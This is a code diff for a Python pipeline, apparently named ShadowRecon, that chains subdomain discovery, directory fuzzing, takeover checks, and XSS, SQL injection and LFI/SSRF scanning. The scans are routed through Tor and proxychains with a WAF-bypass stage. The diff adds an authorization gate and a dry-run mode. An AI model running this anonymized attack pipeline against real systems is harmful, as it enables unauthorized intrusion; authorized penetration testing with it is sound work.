+    run_tool(cfg, ["paramspider", "--list", str(live)],
+             proxychain=False, timeout=900)
+    merged = 0
+    with params.open("a", encoding="utf-8") as out:
+        for host in read_lines(live):
+            stem = re.sub(r"^https?://", "", host)
+            pf = Path(re.sub(r"[/:.]", "_", stem) + ".txt")
+            if not pf.exists():
                 continue
-            url = re.sub(r"=([^&]*)", "=FUZZ", base, count=1)
-            safe = re.sub(r"[^a-zA-Z0-9]", "_", url)[:80]
-            out = os.path.join(out_dir, f"{safe}.csv")
-            cmd = (
-                f"ffuf -w {payloads_file} -u \"{url}\" "
-                f"-mc 200,500 -of csv -o {out}"
-            )
-            run_pc(cmd, timeout=1200)
-    print(f"[+] FFUF LFI/SSRF fuzzing → {out_dir}")
+            for line in read_lines(pf):
+                if "=" in line and line.startswith("http") and in_scope(line, cfg.domain):
+                    out.write(line + "\n")
+                    merged += 1
+    log.info("ParamSpider merged %d URLs into %s", merged, params.name)
 
 
 # =======================
-#   Tool CHECKER
+#   VULN STAGES
 # =======================
 
-def check_tools():
-    tools = {
-        "proxychains": "sudo apt install proxychains (after installing, edit /etc/proxychains.conf to use socks5 127.0.0.1 9050)",
-        "paramspider": "sudo apt install paramspider (after installing, edit /usr/lib/python3/dist-packages/paramspider/main.py to add 'import re' at the top and to add this line 'domainname = re.sub(r'[^a-zA-Z0-9]', '_', domain)' and then edit the result file path accordingly to be 'result_file = f'{domainname}.txt' to avoid issues with special characters in domain names')",
-        "tor": "sudo apt install tor (after installing tor, edit /etc/tor/torrc to enable ControlPort and set HashedControlPassword using 'tor --hash-password <password>')",
-        "subfinder": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
-        "httpx": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
-        "ffuf": "sudo apt install ffuf",
-        "waybackpy": "sudo apt install waybackpy",
-        "nuclei": "go install -v github.com/projectdiscovery/nuclei/cmd/nuclei@latest",
-        "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
-        "sqlmap": "sudo apt install sqlmap",
-        "wafw00f": "sudo apt install wafw00f",
-    }
-    missing_tools = []
+def xss_with_dalfox(cfg: Config, params: Path) -> Path:
+    out = cfg.outdir / "xss_dalfox.txt"
+    run_tool(cfg, ["dalfox", "file", str(params),
+                   "--only-poc", "--worker", "1", "-o", str(out)], timeout=600)
+    log.info("Dalfox XSS done -> %s", out.name)
+    return out
 
-    print("\n========== Tool Check ==========")
-    for tool, install_cmd in tools.items():
+
+def sqli_with_sqlmap(cfg: Config, params: Path) -> Path:
+    out = cfg.outdir / "sqlmap_out"
+    out.mkdir(exist_ok=True)
+    run_tool(cfg, ["sqlmap", "-m", str(params), "--batch", "--random-agent",
+                   "--level", "1", "--risk", "1", f"--output-dir={out}"],
+             timeout=3600)
+    log.info("SQLMap run finished -> %s", out.name)
+    return out
+
+
+def lfi_ssrf_with_ffuf(cfg: Config, params: Path) -> None:
+    if not cfg.lfi_payloads:
+        return
+    out_dir = cfg.outdir / "ffuf_lfi_ssrf"
+    out_dir.mkdir(exist_ok=True)
+    for base in read_lines(params):
+        if "=" not in base:
+            continue
+        url = re.sub(r"=([^&]*)", "=FUZZ", base, count=1)
+        run_tool(cfg, ["ffuf", "-w", str(cfg.lfi_payloads), "-u", url,
+                       "-mc", "200,500", "-of", "csv",
+                       "-o", str(out_dir / f"{slugify(url)}.csv")], timeout=1200)
+    log.info("FFUF LFI/SSRF fuzzing -> %s", out_dir.name)
+
+
+# =======================
+#   SETUP / GUARDRAILS
+# =======================
+
+def check_tools(cfg: Config) -> None:
+    if sys.platform != "linux":
+        log.warning("This pipeline targets Linux (Kali/Parrot/Debian). "
+                    "proxychains/tor and Go tools may be unavailable on %s.",
+                    sys.platform)
+    missing = []
+    log.info("Tool check:")
+    for tool, hint in TOOLS.items():
         if shutil.which(tool):
-            print(f"[OK] {tool}")
+            log.info("  [OK] %s", tool)
         else:
-            print(f"[MISSING] {tool} - install with: {install_cmd}")
-            missing_tools.append(tool)
-    print("================================\n")
-    if missing_tools:
-        print("[ERROR] Missing tools detected. Please install them and try again.")
+            log.warning("  [MISSING] %s - install: %s", tool, hint)
+            missing.append(tool)
+    if missing and not cfg.dry_run:
+        log.error("Missing tools: %s. Install them or use --dry-run.", ", ".join(missing))
         sys.exit(1)
 
 
+def authorization_gate(cfg: Config, authorized_flag: bool, assume_yes: bool) -> None:
+    """Guardrail: do not run active scans without explicit authorization."""
+    if cfg.dry_run:
+        return
+    if not authorized_flag:
+        log.error("Active scanning requires --authorized. You must have explicit "
+                  "permission to test %s. Aborting.", cfg.domain)
+        sys.exit(2)
+    if assume_yes:
+        return
+    if not sys.stdin.isatty():
+        log.error("No TTY to confirm scope; pass --yes only for authorized automation.")
+        sys.exit(2)
+    print(f"\nYou are about to actively scan: {cfg.domain}")
+    print("Confirm you are authorized by retyping the domain exactly:")
+    try:
+        typed = input("> ").strip()
+    except (EOFError, KeyboardInterrupt):
+        sys.exit(2)
+    if typed != cfg.domain:
+        log.error("Confirmation mismatch. Aborting.")
+        sys.exit(2)
 
 
-# =======================
-#   MAIN ORCHESTRATOR
-# =======================
+def build_config(args: argparse.Namespace) -> Config:
+    domain = parse_target(args.url)  # raises ValueError on bad input
 
-def main():
-    check_tools()
-    ap = argparse.ArgumentParser(description="Tor + proxychains WAF + recon & vuln pipeline")
-    ap.add_argument("-u", "--url", required=True, help="Target URL, e.g. https://example.com/")
-    ap.add_argument("-w", "--wordlist", required=True, help="Wordlist for dirs/subdomains")
-    ap.add_argument("--lfi-payloads", help="Wordlist for LFI/SSRF payloads (optional)")
-    args = ap.parse_args()
-
-    parsed = urlparse(args.url)
-    domain = parsed.netloc.split(":")[0]
-
-    print(f"[+] Target URL: {args.url}")
-    print(f"[+] Domain: {domain}")
-
-    # Optional initial rotation
-    #rotate_ip()
-
-    # 0) WAF detection + bypass attempts (Tor + proxychains)
-    stage_waf(args.url)
-
-    # 1) Subdomains → live
-    subs_file = enum_subdomains(domain, out_file="subdomains.txt")
-    live_file = probe_httpx(subs_file, out_file="live.txt")
-
-    # 2) Historical URLs
-    wayback_file = wayback_urls(domain, out_file="wayback.txt")
-
-    # 3) Fuzz dirs on live
-    fuzz_dirs_ffuf(live_file, args.wordlist, out_dir="ffuf_dirs")
-
-    # 4) Nuclei takeover
-    nuclei_takeover(live_file, templates_dir=os.path.expanduser("~/nuclei-templates"), out_file="nuclei_takeover.txt")
-
-    # 5) Build param URLs
-    params_file = build_param_urls_from_wayback(wayback_file, params_file="params.txt")
-    # Run ParamSpider (GitHub version)
-    paramspider_file = run_paramspider(live_file, out_file="paramspider_raw.txt")
-
-    # If output exists, merge results into params.txt
-    if paramspider_file and os.path.exists(paramspider_file):
-        with open(params_file, "a") as out:
-            with open(paramspider_file, "r") as ps:
-                for line in ps:
-                    url = line.strip()
-                    if "=" in url and url.startswith("http"):
-                        out.write(url + "\n")
-
-
-    # 6) XSS
-    xss_with_dalfox(params_file, out_file="xss_dalfox.txt")
-
-    # 7) SQLi
-    sqli_with_sqlmap(params_file, out_dir="sqlmap_out")
-
-    # 8) LFI / SSRF fuzz (optional)
+    wordlist = Path(args.wordlist).expanduser()
+    if not wordlist.is_file():
+        raise SystemExit(f"wordlist not found: {wordlist}")
+    lfi = None
     if args.lfi_payloads:
-        lfi_ssrf_with_ffuf(params_file, args.lfi_payloads, out_dir="ffuf_lfi_ssrf")
+        lfi = Path(args.lfi_payloads).expanduser()
+        if not lfi.is_file():
+            raise SystemExit(f"LFI payload list not found: {lfi}")
+
+    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+    outdir = Path(args.outdir).expanduser() / f"{domain}-{stamp}"
+    outdir.mkdir(parents=True, exist_ok=True)
+
+    return Config(
+        target=args.url,
+        domain=domain,
+        wordlist=wordlist,
+        outdir=outdir,
+        lfi_payloads=lfi,
+        tor_control_port=args.tor_control_port,
+        tor_control_password=args.tor_pass or os.environ.get("TOR_CONTROL_PASSWORD", ""),
+        rate_limit=args.rate_limit,
+        dry_run=args.dry_run,
+        use_proxychains=not args.no_proxychains,
+        make_report=not args.no_report,
+    )
+
+
+def setup_logging(outdir: Path, verbose: bool) -> None:
+    file_h = logging.FileHandler(outdir / "audit.log", encoding="utf-8")
+    file_h.setFormatter(logging.Formatter("%(asctime)s %(levelname)-7s %(message)s"))
+    logging.basicConfig(level=logging.DEBUG if verbose else logging.INFO,
+                        handlers=[console.log_handler(verbose), file_h])
+
+
+def finish(cfg: Config, started: datetime) -> None:
+    sections = report.collect(cfg.outdir)
+    console.summary_table([(s.title, s.count) for s in sections])
+    if cfg.make_report:
+        meta = {
+            "Target": cfg.target,
+            "Domain": cfg.domain,
+            "Started": started.strftime("%Y-%m-%d %H:%M:%S"),
+            "Duration": str(datetime.now() - started).split(".")[0],
+            "Mode": "dry-run" if cfg.dry_run else "live",
+            "Output dir": cfg.outdir.name,
+        }
+        path = report.generate(cfg.outdir, meta)
+        log.info("HTML report -> %s", path)
+    log.info("Done. Artifacts in %s", cfg.outdir)
+
+
+# =======================
+#   MAIN
+# =======================
+
+def parse_args(argv: Optional[Sequence[str]] = None) -> argparse.Namespace:
+    ap = argparse.ArgumentParser(
+        description="ShadowRecon - authorized recon & vuln pipeline (Tor + proxychains)")
+    ap.add_argument("-u", "--url", required=True, help="Target URL, e.g. https://example.com/")
+    ap.add_argument("-w", "--wordlist", required=True, help="Wordlist for dir fuzzing")
+    ap.add_argument("--lfi-payloads", help="Payload list for LFI/SSRF fuzzing (optional)")
+    ap.add_argument("--outdir", default="runs", help="Base dir for run artifacts (default: runs/)")
+    ap.add_argument("--tor-pass", help="Tor control password (else env TOR_CONTROL_PASSWORD)")
+    ap.add_argument("--tor-control-port", type=int, default=9051)
+    ap.add_argument("--rate-limit", type=float, default=0.0, help="Seconds between HTTP requests")
+    ap.add_argument("--no-proxychains", action="store_true", help="Do not wrap tools in proxychains")
+    ap.add_argument("--no-report", action="store_true", help="Skip HTML report generation")
+    ap.add_argument("--authorized", action="store_true", help="Assert you may scan the target")
+    ap.add_argument("--yes", action="store_true", help="Skip interactive scope confirmation")
+    ap.add_argument("--dry-run", action="store_true", help="Print planned actions; execute nothing")
+    ap.add_argument("-v", "--verbose", action="store_true")
+    return ap.parse_args(argv)
+
+
+def main(argv: Optional[Sequence[str]] = None) -> None:
+    args = parse_args(argv)
+    console.banner(VERSION)
+    cfg = build_config(args)
+    setup_logging(cfg.outdir, args.verbose)
+    log.info("Target: %s | Domain: %s | Output: %s", cfg.target, cfg.domain, cfg.outdir)
+
+    check_tools(cfg)
+    authorization_gate(cfg, args.authorized, args.yes)
+
+    started = datetime.now()
+    stage_waf(cfg)                                   # 0) WAF detect + bypass payloads
+    subs = enum_subdomains(cfg)                      # 1) subdomains -> live
+    live = probe_httpx(cfg, subs)
+    wayback = wayback_urls(cfg)                      # 2) historical URLs + dir fuzz
+    fuzz_dirs_ffuf(cfg, live)
+    nuclei_takeover(cfg, live)                       # 3) takeover + params
+    params = build_param_urls(cfg, wayback)
+    run_paramspider(cfg, live, params)
+    xss_with_dalfox(cfg, params)                     # 4) active vuln scans
+    sqli_with_sqlmap(cfg, params)
+    lfi_ssrf_with_ffuf(cfg, params)
+
+    finish(cfg, started)
 
 
 if __name__ == "__main__":
